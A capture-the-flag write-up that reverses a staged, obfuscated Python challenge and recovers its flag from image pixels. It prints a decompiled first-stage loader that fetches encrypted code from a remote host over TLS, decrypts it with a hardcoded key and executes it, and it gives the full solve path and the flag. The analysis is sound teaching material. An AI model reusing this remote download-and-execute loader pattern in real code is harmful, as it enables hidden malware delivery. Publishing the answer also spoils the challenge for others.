# Obfpyscated - Writeup

## Challenge Info

- Name: `obfpyscated`
- Category: `reversing`
- Description: `python is really easy to understand because it's basically just pseudocode lol`

## TL;DR

This challenge is a staged Python loader.

1. [meow.py](./meow.py) is just a tiny XOR-obfuscated `exec(...)` wrapper.
2. The decoded first stage contains a Python `marshal` blob, so the provided [Dockerfile](./Dockerfile) matters because the blob is version-specific and was built for Python `3.10`.
3. That first stage connects to `meow.sylvie.fyi`, downloads `/static/suspicious_among_us`, decrypts it with a hardcoded AES-GCM key, unmarshals the result, and executes it.
4. The second stage downloads `ritsec_catgirl.png` and checks user input by comparing each character to `R ^ G ^ B` at a fixed list of pixel coordinates.
5. Reading those pixels directly recovers the expected input, which is the flag.

---

## Initial Recon

The directory is tiny:

- `meow.py`
- `Dockerfile`
- `run.sh`

The Dockerfile already hints at something important:

```dockerfile
FROM python:3.10.2-slim

RUN pip install --no-cache-dir pycryptodome pillow

WORKDIR /run

COPY meow.py .

CMD [ "python3", "meow.py" ]
```

That Python version becomes relevant very quickly, because the challenge uses `marshal`, and marshal format is CPython-version-specific.

---

## Stage 0: The Visible Wrapper

The whole file is one line:

```python
exec(''.join(chr(_^2)for _ in b'...'))
```

So the first layer is trivial:

- take the bytes literal
- XOR every byte with `2`
- interpret the result as Python source
- execute it

Decoding that wrapper gives something of the form:

```python
_=lambda:0
__=__import__('marshal').loads(<obfuscated_bytes>)
_.__code__=__
_()
```

This tells us two things:

1. The real payload is a marshaled code object.
2. We should analyze it under Python `3.10`, not the local `3.12`, because otherwise `marshal.loads()` will fail.

That is exactly why the challenge author included Docker.

---

## Why Python 3.10 Matters

Trying to load the blob under Python `3.12` throws a marshal error:

```text
ValueError: bad marshal data (unknown type code)
```

So the intended analysis path is:

1. Build the provided container.
2. Run Python `3.10.2`.
3. Decode and disassemble the marshaled code there.

Once I did that, the loader became straightforward.

---

## Stage 1: The Real Bootstrapper

Disassembling the first marshaled payload shows this high-level behavior:

```python
import socket
import ssl
from Crypto.Cipher import AES
import marshal

sock = ssl.create_default_context().wrap_socket(
    socket.socket(socket.AF_INET, socket.SOCK_STREAM),
    server_hostname="meow.sylvie.fyi",
)
sock.connect(("meow.sylvie.fyi", 443))
sock.sendall(b"GET /static/suspicious_among_us HTTP/1.1\r\n"
             b"Host: meow.sylvie.fyi\r\n"
             b"Connection: close\r\n\r\n")

response = recv_all(sock)
body = response[response.index(b"\r\n\r\n") + 4:]

key = bytes.fromhex("030acefab0ee440c679902358edf536e56cedf017bcf130f3642bd7c20eaefde")
pt = AES.new(key, AES.MODE_GCM, nonce=body[-16:]).decrypt_and_verify(
    body[:-32],
    body[-32:-16],
)

co = marshal.loads(pt)
f = lambda: None
f.__code__ = co
f()
```

So stage 1 is just a secure loader for stage 2:

- remote host: `meow.sylvie.fyi`
- remote path: `/static/suspicious_among_us`
- transport: raw TLS socket
- crypto: AES-GCM
- hardcoded key:

```text
030acefab0ee440c679902358edf536e56cedf017bcf130f3642bd7c20eaefde
```

The body format is:

```text
ciphertext || tag || nonce
```

with:

- `body[:-32]` = ciphertext
- `body[-32:-16]` = authentication tag
- `body[-16:]` = nonce

At this point the challenge is no longer "local only"; the actual logic lives on the remote server.

---

## Stage 2: Decrypting The Remote Payload

After fetching and decrypting `/static/suspicious_among_us`, unmarshaling it under Python `3.10`, and disassembling it, the second stage turns out to be much simpler than the first.

Its logic is:

1. Open another TLS connection to `meow.sylvie.fyi`.
2. Request:

```text
/static/ritsec_catgirl.png
```

3. Strip the HTTP headers and load the remaining bytes as a PNG using Pillow.
4. Prompt the user with:

```text
mreow:
```

5. Compare the input string against a fixed list of `(x, y)` coordinates.

The key verification loop is effectively:

```python
coords = [...]
guess = input("mreow: ")

if len(guess) != len(coords):
    print("hiss")
    exit()

for i, ch in enumerate(guess):
    r, g, b = image.getpixel(coords[i])
    if (r ^ g ^ b) != ord(ch):
        print("hiss")
        exit()

image.show()
```

That means the expected string is literally encoded inside the image.

---

## The Core Observation

Each coordinate encodes exactly one character:

```text
character = chr(R ^ G ^ B)
```

There is no extra transformation:

- no permutation beyond the coordinate order
- no hashing
- no encryption in the second stage
- no checksum

So once we recover the coordinate list from the bytecode, we can reconstruct the required input without running the program interactively at all.

---

## The Coordinate List

The second-stage bytecode stores a tuple of 65 coordinates. I pulled that list directly from the disassembly and reused it in [solve.py](./solve.py).

The important property is just:

```text
len(coords) = 65
```

That already strongly suggests the input is probably the full flag string.

---

## Recovering The Flag

Once the PNG is downloaded, the solve is only a few lines:

```python
from PIL import Image

img = Image.open("ritsec_catgirl.png")
flag = "".join(
    chr(img.getpixel(coord)[0] ^ img.getpixel(coord)[1] ^ img.getpixel(coord)[2])
    for coord in coords
)
print(flag)
```

---

## Why This Works

The challenge uses heavy staging and obfuscation, but the actual validation logic is weak:

- the program never transforms the user input into some hidden form
- it only compares characters directly
- every character is recoverable independently from one pixel

So the problem is not "solve a hard algorithm" but "peel back the loader layers until the real check is visible."

Once the second stage is decrypted, the challenge collapses immediately.

---

## Full Solve Path

### 1. Decode the one-line wrapper

XOR every byte in the outer blob with `2`.

### 2. Notice the marshaled code object

The decoded source loads a `marshal` blob and swaps it into a lambda's `__code__`.

### 3. Use Python 3.10

The marshal blob is version-specific, so use the provided Docker image.

### 4. Disassemble stage 1

Stage 1:

- connects to `meow.sylvie.fyi:443`
- requests `/static/suspicious_among_us`
- decrypts it with AES-GCM using the hardcoded key
- unmarshals and executes the result

### 5. Disassemble stage 2

Stage 2:

- requests `/static/ritsec_catgirl.png`
- prompts for input
- verifies each character as `R ^ G ^ B` at fixed coordinates

### 6. Read the image directly

Download the PNG, read those pixels, and reconstruct the string.

### 7. Recover the flag

The reconstructed string is the flag.

---

## Security / Design Notes

This challenge is a nice example of the difference between obfuscation and security:

- the first layer looks intimidating, but it is only XOR and `marshal`
- the second layer adds network staging and AES-GCM, but the key is hardcoded in the client
- the final check hides data in an image, but the extraction method is linear and fully reversible

Every layer slows analysis a little, but none of them actually protect the secret once the client code is under attacker control.

---

## Final Flag

```text
RS{1f_y0u_r4n_th47_0n_y0ur_h0s7_y0u_sh0uld_m4k3_b3tter_d3cis1on5}
```
